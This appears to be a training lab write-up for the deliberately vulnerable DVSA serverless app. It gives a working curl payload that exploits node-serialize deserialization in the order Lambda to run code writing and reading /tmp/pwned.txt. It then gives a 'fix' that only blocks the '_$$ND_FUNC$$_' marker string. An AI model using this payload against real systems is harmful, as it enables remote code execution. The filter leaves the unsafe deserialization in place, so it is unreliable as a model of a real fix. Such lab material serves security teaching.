# Event Injection Vulnerability 
The Event Injection vulnerability in the DVSA application happens because the AWS Lambda backend uses a risky library called node-serialize. This tool mistakenly treats certain text inputs as live code instead of plain data, leading to insecure deserialization. By sending a specially crafted string through the API Gateway, an attacker can trick the system into running their own commands. This results in Remote Code Execution, giving them the power to steal data or change how the application functions without permission.


---
## Vulnerability Exploting
To achieve this vulnerability, we will use the Terminal and the AWS console. You have to following these steps:
1.	Open the AWS console using your account
2.	Search for API Gateway and open it
3.	Click on the  DVSA-APIS and go to the stages from the left bar.
4.	Expand the stage and go to the post option under the order field.
5.	Copy the Invoke URL
6. Open the Terminal and write this command

```
curl.exe -X POST "[you should add the invoke URL for the order]" `
>> -H "Content-Type: application/json" `
>> -d '{\"action\": \"_$$ND_FUNC$$_function(){ var fs = require(''fs''); fs.writeFileSync(''/tmp/pwned.txt'', ''You are reading the contents of my hacked file!''); var fileData = fs.readFileSync(''/tmp/pwned.txt'', ''utf-8''); console.error(''FILE READ SUCCESS: '' + fileData); }()\", \"cart-id\":\"123\"}'
```
> After running this command you will recive this {"message": "Internal server error"} message

To prove that you achieve the vulnerability open AWS consol and do these steps:

1.	Search and open CloudWatch.
2.	Go to Log Management under the Logs in the left bar.
3.	Search for /aws/lambda/DVSA-ORDER-MANAGER and open the recent log.
You have to see something simmilar to the image below


---
## Vulnerability Fixing

The fix of this vulnerability is done in the Order_Manage Lambda function by doing the following:

1.	Search for and open Lambda in the AWS console
2.	Open the DVSA-ORDER-MANAGER function from the functions list.
3.	Open order-manager.JS file in the code tab.
4.	Add this block of code at the biggining:
```
if (event.body && event.body.includes("_$$ND_FUNC$$_")) {
        console.error("Bad Request.");
        return callback(null, {
            statusCode: 400,
            body: JSON.stringify({ message: "Bad Request" })
        });
    }
```
5.	Deploy the changes by clicking on the Deployed button at the left side of the Code source section. 

The final code should be as the image below

To verify that the fix above is working, we have to run the command again and see the results in the terminal and the CloudWatch logs. You will get the bad request message in the terminal, but in the CloudWatch logs you will see Error Bad request.
